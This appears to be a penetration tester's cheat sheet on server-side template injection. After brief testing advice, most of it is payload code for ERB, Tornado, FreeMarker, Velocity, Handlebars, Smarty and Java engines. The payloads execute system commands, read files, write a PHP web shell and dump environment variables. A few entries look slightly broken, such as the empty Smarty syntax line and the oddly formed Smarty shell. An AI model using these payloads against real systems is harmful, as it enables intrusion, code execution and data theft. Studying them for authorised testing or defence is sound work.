# Server-Side Template Injection {SSTI}

Server Side template injection is a vulnerability that arises when the web application utilizes a templating engine and excepts user input directly into a templated field or allows a user to use template commands directly without; limit, sanitization or restriction


## Testing for Server-Side Template Injection

+ Fuzz URL parameters with template syntax
+ Where page editing which returns somewhere on the web application is possible fuzz those inputs
+ Attempt to induce template related errors which reveal the template engine in use
+ Craft a exploit specific to the templating engine

![Determining Template Engine](./images/Template_Engine_Decision_Diagram.png)

~ From [Portswigger](https://portswigger.net/web-security/images/template-decision-tree.png) ~

### Typical Examples of Injectable Areas

#### URL Parameters

`domain.net/message?=close_template_tag}}insert_payload`

`domain.net/message?=close_template_tag%>insert_payload`

#### Page Editors

```
<p>Add ur html yay</p>

<p>{{payload}}</p>

```

### Identification Polyglots

`${{<%[%'"}}%\`

## Payloads By Template Engine

### ERB 

#### Tag Syntax

`<%= %>`

#### Identification Payloads

`<%= 7*7 %>`

#### General Payloads

`<%= system("cat /path/to/file") %>`

`<%= Dir.entries('/') %>`

`<%= File.open('/example/arbitrary-file').read %>`

### Tornado

#### Tag Syntax

`{{ }}`

#### Identification Payloads

`{{7*7}}`

#### General Payload

`{% import os %}{{ os.popen("cat /path/to/file").read() }}`

#### FreeMarker

##### Tag Syntax

`${ }`

#### Identification Payloads

`${7*7}`

##### General Payload

`<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /path/to/file") }`

### Velocity

#### Tag Syntax

`$class`

#### Identification Payloads

```
#set( $a = "Velocity" )
$foo
```

#### General Payload

```
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("cat /path/to/file"))$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))
#end
```

### Handlebars

#### Tag Syntax

`{{ }}`

#### General Payload

```
wrtz{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('cat /path/to/file');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Smarty

#### Tag Syntax

#### General Payload

`{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cat /path/to/file']); ?>",self::clearConfig())}`

## Dumping Template Objects

+ It may not always be possible to escalate a SSTI vulnerability to gain RCE
+ However where template injection is possible there is still a high potential for sensitive data exposure and vulnerability chaining
+ One way to develop a meaningful exploit from a SSTI is to use the native templating languages environment variables to dump all the objects used in the context including custom developer ones

### JAVA Based Engines

`${T(java.lang.System).getenv()}`

## Resources

+ [ERB Syntax](https://www.stuartellis.name/articles/erb/)
+ [Server-Side template injection in tornado](https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/)
+ [ERB Template-Injection](https://www.trustedsec.com/blog/rubyerb-template-injection/)
+ [Black Hat Server-Side Template Injection](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)